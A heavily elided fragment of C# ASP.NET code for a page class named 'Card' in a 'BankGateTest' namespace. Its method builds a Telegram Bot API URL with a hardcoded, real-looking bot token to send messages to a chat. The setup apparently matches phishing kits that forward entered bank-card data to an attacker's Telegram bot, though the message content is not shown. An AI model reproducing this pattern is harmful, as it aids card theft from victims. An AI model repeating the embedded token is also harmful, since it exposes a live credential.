...
namespace BankGateTest
{
    public partial class Card : System.Web.UI.Page
    {
        ...
        public async Task SendTelegramMessage(string id, string message)
        {
            ...
            {
                string url = string.Format("https://api.telegram.org/bot8527601171:AAG_fbFEAqXGhQFfYmxh3oevGM8OWZfRpK0/sendMessage?chat_id={1}&text={0}&parse_mode=html", message, id);
